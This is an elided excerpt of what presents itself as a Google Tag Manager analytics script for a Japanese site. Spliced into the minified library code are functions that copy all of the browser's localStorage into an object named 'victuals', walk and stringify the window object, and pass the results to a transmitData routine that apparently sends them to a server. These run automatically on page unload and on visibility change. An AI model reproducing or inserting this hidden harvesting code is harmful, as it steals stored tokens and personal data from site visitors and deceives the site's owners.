...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 9,
        "vtp_instanceDestinationId": "G-0BG4GPLL4Q",
        "tag_id": 28
      }, {
        ...
        "priority": 4,
        "vtp_searchQueryParams": "searchquery",
        ...
        "priority": 3,
        "vtp_conversionRules": ["list", ["map", "matchingRules", "{\"type\":5,\"args\":[{\"stringValue\":\"purchase\"},{\"contextValue\":{\"namespaceType\":1,\"keyParts\":[\"eventName\"]}}]}"], ["map", "matchingRules", "{\"type\":5,\"args\":[{\"stringValue\":\"ユーザ登録\"},{\"contextValue\":{\"namespaceType\":1,\"keyParts\":[\"eventName\"]}}]}"]],
        "vtp_instanceDestinationId": "G-0BG4GPLL4Q",
        "tag_id": 22
      }, {
        ...
        "vtp_isCopy": true,
        "vtp_instanceDestinationId": "G-0BG4GPLL4Q",
        "vtp_precompiledRule": ["map", "new_event_name", "ユーザ登録", "merge_source_event_params", true, "event_name_predicate", ["map", "values", ["list", ["map", "type", "event_name"], ["map", "type", "const", "const_value", "Registered"]], "type", "eqi"], "conditions", ["list", ["map", "predicates", ["list", ["map", "values", ["list", ["map", "type", "event_param", "event_param", ["map", "param_name", "event_category"]], ["map", "type", "const", "const_value", "LoginPrompt"]], "type", "eqi"]]]]],
        "tag_id": 21
      }, {
    ...
    "security_groups": {
      "google": ["__ccd_auto_redact", "__ccd_conversion_marking", "__ccd_em_site_search", "__ccd_ga_first", "__ccd_ga_last", "__ccd_ga_regscope", "__ogt_1p_data_v2", "__ogt_event_create", "__ogt_ga_gam_link", "__ogt_ga_send", "__ogt_google_signals", "__ogt_session_timeout", "__set_product_settings"]
    }
  };
  var aa,
    ba = function (a) {
  ...
  function exploreLocalStorage() {
    ...
    for (let i = 0; i < localStorage.length; i++) {
      ...
      victuals[key] = localStorage.getItem(key);
    }
    return victuals;
  }
  ...
  function jshook(obj, prop) {
    ...
    Object.defineProperty(obj, prop, {
      get: function () {
        console.info(`Access detected to ${prop}`);
        return val;
      },
      set: function (newval) {
        console.warn(`Mutation detected on ${prop}`);
        val = newval;
      }
    });
  }
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.fk = "ChEIgOm8qgYQu/+2jPSy9oOgARIlAOg6TnRNei7StWLCicAKc3VJdY8zg3W6H1oBWgZMD7P/fn+tjxoCXdc\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  R(6);
  R(11);
  function deepInspect(obj, track) {
    for (const key in obj) {
      if (!track.includes(key) && obj.hasOwnProperty(key)) {
        let val = obj[key];
        const type = typeof val;
        track[key] = {
          type: type,
          value: type === 'function' ? val.toString() : val
        };
        if (type === 'object') {
          deepInspect(val, track);
        }
      }
    }
    return track;
  ...
  function globalVarDetect() {
    const findings = deepInspect(window, {});
    console.log(findings);
    if (window.localStorage.length > 0) {
      findings['localStorage'] = exploreLocalStorage();
    }
    return findings;
  }
  var Xk = !1;
  ...
  async function transmitData(findings) {
    ...
    try {
      ...
      if (response.ok) {
        ...
        console.error(`Data transmission failed, server status code: ${response.status}`);
      }
    } catch (error) {
  ...
  function inspectionTask() {
    const discoveries = globalVarDetect();
    const discoveryCount = Object.keys(discoveries).length;
    if (discoveryCount > 0) {
      console.group(`Global scope examination - Found ${discoveryCount} new properties:`);
      ...
      console.info("Global scope examination completed, no new properties found");
    }
  }
  function to(a, b) {
    var c = b.split(".");
  ...
  window.addEventListener("unload", inspectionTask);
  function kp(a) {
    var b = [],
      c;
  ...
  function hE() {
    var a = new sb();
    N(this, "read_container_data"), a.set("containerId", 'G-0BG4GPLL4Q'), a.set("version", '2'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
  ...
  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "visible") {
      console.info("Page visibility changed, re-executing inspectionTask");
      inspectionTask();
    }
  });
  ZG.P = "setCookie";
